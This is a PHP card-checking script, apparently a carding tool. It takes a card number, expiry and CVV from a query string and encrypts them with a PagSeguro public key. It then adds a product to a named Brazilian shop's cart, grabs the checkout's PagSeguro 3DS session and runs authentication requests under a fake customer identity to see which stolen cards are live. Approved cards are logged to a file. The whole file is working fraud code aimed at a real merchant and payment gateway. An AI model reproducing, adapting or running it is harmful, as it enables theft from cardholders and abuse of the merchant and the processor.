<?php
deletarCookies();
error_reporting(0);
ignore_user_abort(true);

$CHAVE_PUBLICA = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAppxpEWys7Hue2mUb4Pgd7CktmmEYDqPiHY65n90dNasCfl6eO8MbpMCSuZMrJhByXToKoIvH6smDLgUaUrivcJ4FrBN1S71vZF9uSr8TkRrenqGlyLe3pYmP408FPRul1YKajJU5q6maT0vwCbTguKp2lBDKK9EGbB1C2nbn1DIOEGjmHk74JSO48AAinwkaZjFEZNQY4dvu9ojgx7ASQb4mzMuI4IJuZ08raLhFA7afqcLocWjHJxo+TtvprIBsiE36TS2QQSaX7FkYajPc1ranXA1HgUgvwwAdMu5o8wB9lqFNKR5cwo72Fnn3i0w6RYmc1mPbzXw97fHxFBLnxwIDAQAB';

function getStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

function deletarCookies() {
    if (file_exists("cookies.txt")) {
        unlink("cookies.txt");
    }
}

function criptografarCartao($numero, $mes, $ano, $cvv) {
    global $CHAVE_PUBLICA;
    
    $pan = preg_replace('/\D/', '', $numero);
    $mes = str_pad($mes, 2, '0', STR_PAD_LEFT);
    $ano = strlen($ano) == 2 ? '20' . $ano : $ano;
    $holder = "TITULAR DO CARTAO";
    $timestamp = round(microtime(true) * 1000);
    $payload = "$pan;$cvv;$mes;$ano;$holder;$timestamp";
    
    $chavePublica = "-----BEGIN PUBLIC KEY-----\n" . chunk_split($CHAVE_PUBLICA, 64, "\n") . "-----END PUBLIC KEY-----";
    
    $publicKey = openssl_pkey_get_public($chavePublica);
    if (!$publicKey) {
        return null;
    }
    
    $success = openssl_public_encrypt($payload, $encrypted, $publicKey, OPENSSL_PKCS1_PADDING);
    
    if (!$success) {
        return null;
    }
    
    return base64_encode($encrypted);
}

function limparHTML($texto) {
    if (!$texto) return "";
    $texto = preg_replace('/<script[^>]*>.*?<\/script>/is', '', $texto);
    $texto = preg_replace('/<style[^>]*>.*?<\/style>/is', '', $texto);
    $substituicoes = [
        '&nbsp;' => ' ', '&eacute;' => 'é', '&ccedil;' => 'ç', '&atilde;' => 'ã',
        '&ecirc;' => 'ê', '&#234;' => 'ê', '&#225;' => 'á', '&#231;' => 'ç',
        '&#227;' => 'ã', '&#243;' => 'ó'
    ];
    $texto = strtr($texto, $substituicoes);
    $texto = preg_replace('/<br\s*\/?>/i', "\n", $texto);
    $texto = preg_replace('/<[^>]*>/', ' ', $texto);
    $texto = preg_replace('/\s+/', ' ', $texto);
    return trim($texto);
}

function extrairSessaoPagSeguro($html) {
    if (preg_match('/var\s+pagseguro_connect_3d_session\s*=\s*[\'"]([^\'"]+)[\'"]/i', $html, $match)) {
        return $match[1];
    }
    return null;
}

function extrairMensagem($html) {
    $padroes = [
        '/<p[^>]*id="Body1"[^>]*>(.*?)<\/p>/is',
        '/<div class="challengeInfoText">(.*?)<\/div>/is',
        '/id="CredentialId-0a-label">(.*?)<\/label>/is',
        '/id="info_message_auth">(.*?)<\/div>/is',
        '/<div class="container_body_text">(.*?)<\/div>/is'
    ];
    foreach ($padroes as $padrao) {
        if (preg_match($padrao, $html, $match)) {
            $texto = limparHTML($match[1]);
            if (!empty($texto)) {
                return $texto;
            }
        }
    }
    return "";
}

$lista = $_GET['lista'];
$lista = str_replace(" " , "|", $lista);
$lista = str_replace("%20", "|", $lista);
$lista = preg_replace('/[ -]+/' , '-' , $lista);
$lista = str_replace("/" , "|", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];

switch($ano){
case 2024: $ano = "24"; break;
case 2025: $ano = "25"; break;
case 2026: $ano = "26"; break;
case 2027: $ano = "27"; break;
case 2028: $ano = "28"; break;
case 2029: $ano = "29"; break;
case 2030: $ano = "30"; break;
case 2031: $ano = "31"; break;
case 2032: $ano = "32"; break;
case 2033: $ano = "33"; break;
case 2034: $ano = "34"; break;
case 2035: $ano = "35"; break;
case 2036: $ano = "36"; break;
case 2037: $ano = "37"; break;
case 2038: $ano = "38"; break;
case 2039: $ano = "39"; break;
}

$encryptedCard = criptografarCartao($cc, $mes, $ano, $cvv);

if (!$encryptedCard) {
    echo '<span class="badge badge-danger">❌ REPROVADO</span> ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | <span class="transation badge-danger">Erro na criptografia</span>';
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);

curl_setopt($ch, CURLOPT_URL, 'https://loja.reformadasbc.com.br/product/retiro/');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "------WebKitFormBoundaryoltuZBXcX9USBGyf\r\nContent-Disposition: form-data; name=\"quantity[274]\"\r\n\r\n\r\n------WebKitFormBoundaryoltuZBXcX9USBGyf\r\nContent-Disposition: form-data; name=\"quantity[275]\"\r\n\r\n\r\n------WebKitFormBoundaryoltuZBXcX9USBGyf\r\nContent-Disposition: form-data; name=\"quantity[276]\"\r\n\r\n\r\n------WebKitFormBoundaryoltuZBXcX9USBGyf\r\nContent-Disposition: form-data; name=\"quantity[537]\"\r\n\r\n1\r\n------WebKitFormBoundaryoltuZBXcX9USBGyf\r\nContent-Disposition: form-data; name=\"add-to-cart\"\r\n\r\n196\r\n------WebKitFormBoundaryoltuZBXcX9USBGyf--\r\n");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type: multipart/form-data; boundary=----WebKitFormBoundaryoltuZBXcX9USBGyf',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"'
));
curl_exec($ch);

curl_setopt($ch, CURLOPT_POST, 0);
curl_setopt($ch, CURLOPT_URL, 'https://loja.reformadasbc.com.br/checkout/');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'referer: https://loja.reformadasbc.com.br/product/retiro/'
));
$checkout_html = curl_exec($ch);
$sessao_pagseguro = extrairSessaoPagSeguro($checkout_html);

if(!$sessao_pagseguro) {
    echo '<span class="badge badge-danger">❌ REPROVADO</span> ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | <span class="transation badge-danger">Sessão não encontrada</span>';
    exit;
}

curl_setopt($ch, CURLOPT_URL, 'https://sdk.pagseguro.com/checkout-sdk/3ds/authentications');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"paymentMethod":{"type":"CREDIT_CARD","installments":1,"card":{"encrypted":"'.$encryptedCard.'"}},"dataOnly":false,"customer":{"name":"r4in undefined","email":"r4indopix@gmail.com","phones":[{"country":"55","area":"11","number":"919198182","type":"MOBILE"}]},"amount":{"value":5000,"currency":"BRL"},"billingAddress":{"street":"Avenida Paulista","number":"111","complement":"Bela Vista","regionCode":"SP","country":"BRA","city":"São Paulo","postalCode":"01310000"},"deviceInformation":{"httpBrowserColorDepth":24,"httpBrowserJavaEnabled":false,"httpBrowserJavaScriptEnabled":true,"httpBrowserLanguage":"pt-BR","httpBrowserScreenHeight":1000,"httpBrowserScreenWidth":450,"httpBrowserTimeDifference":180,"httpDeviceChannel":"Browser","userAgentBrowserValue":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"}}');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authorization: '.$sessao_pagseguro,
    'content-type: application/json',
    'origin: https://loja.reformadasbc.com.br',
    'referer: https://loja.reformadasbc.com.br/',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'accept: */*',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"'
));
$auth_response = curl_exec($ch);
$auth_data = json_decode($auth_response, true);
$three_ds_id = $auth_data['id'] ?? '';

if(!$three_ds_id) {
    $status = $auth_data['status'] ?? ($auth_data['message'] ?? 'Falha na autenticação');
    echo '<span class="badge badge-danger">❌ REPROVADO</span> ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | <span class="transation badge-danger">' . $status . '</span>';
    exit;
}

curl_setopt($ch, CURLOPT_URL, 'https://sdk.pagseguro.com/checkout-sdk/3ds/authentications/'.$three_ds_id);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authorization: '.$sessao_pagseguro,
    'content-type: application/json',
    'content-length: 0',
    'origin: https://loja.reformadasbc.com.br',
    'referer: https://loja.reformadasbc.com.br/',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
));
$confirm_response = curl_exec($ch);
$confirm_data = json_decode($confirm_response, true);

if(isset($confirm_data['status']) && $confirm_data['status'] === 'SUCCESS') {
    file_put_contents('aprovadas.txt', $cc . '|' . $mes . '|' . $ano . '|' . $cvv . PHP_EOL, FILE_APPEND);
    echo '<span class="badge badge-success">✅ APROVADO</span> ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | <span class="transation badge-success">APROVADO</span>';
} elseif(isset($confirm_data['status']) && $confirm_data['status'] === 'REQUIRE_CHALLENGE') {
    $challenge = $confirm_data['challenge'] ?? [];
    $acs_url = $challenge['acsUrl'] ?? '';
    $creq = $challenge['payload'] ?? '';
    
    if($acs_url && $creq) {
        curl_setopt($ch, CURLOPT_URL, $acs_url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'creq='.$creq);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'content-type: application/x-www-form-urlencoded',
            'origin: https://loja.reformadasbc.com.br',
            'referer: https://loja.reformadasbc.com.br/'
        ));
        $challenge_response = curl_exec($ch);
        $mensagem = extrairMensagem($challenge_response);
        
        if(!empty($mensagem)) {
            file_put_contents('aprovadas.txt', $cc . '|' . $mes . '|' . $ano . '|' . $cvv . PHP_EOL, FILE_APPEND);
            echo '<span class="badge badge-success">✅ APROVADO</span> ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | <span class="transation badge-success">' . $mensagem . '</span>';
        } else {
            echo '<span class="badge badge-danger">❌ REPROVADO</span> ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | <span class="transation badge-danger">REQUIRE_CHALLENGE</span>';
        }
    } else {
        echo '<span class="badge badge-danger">❌ REPROVADO</span> ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | <span class="transation badge-danger">Challenge inválido</span>';
    }
} else {
    $status = $confirm_data['status'] ?? 'DECLINED';
    $mensagem = $confirm_data['message'] ?? '';
    echo '<span class="badge badge-danger">❌ REPROVADO</span> ' . $cc . '|' . $mes . '|' . $ano . '|' . $cvv . ' | <span class="transation badge-danger">' . ($mensagem ?: $status) . '</span>';
}

curl_close($ch);
if (file_exists("cookies.txt")) {
    unlink("cookies.txt");
}
?>
